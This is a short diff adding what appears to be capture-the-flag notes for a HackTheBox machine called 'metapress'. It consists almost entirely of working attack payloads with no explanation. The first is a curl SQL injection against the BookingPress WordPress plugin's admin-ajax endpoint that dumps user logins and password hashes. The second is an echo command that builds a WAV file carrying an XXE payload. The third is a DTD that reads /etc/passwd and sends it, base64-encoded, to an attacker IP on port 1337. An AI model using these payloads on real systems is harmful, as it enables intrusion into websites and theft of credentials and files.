@@ -1,0 +1,10 @@
+curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),0,1,2,3,4,5,6 from wp_users-- -'
+
+-> Malicious WAV file:
+
+echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.13:1337/poc.dtd'"'"'>%remote;%init;%trick;] >\x00'> poc.wav
+
+-> .dtd file:
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.16.13:1337/?p=%file;'>" >
+
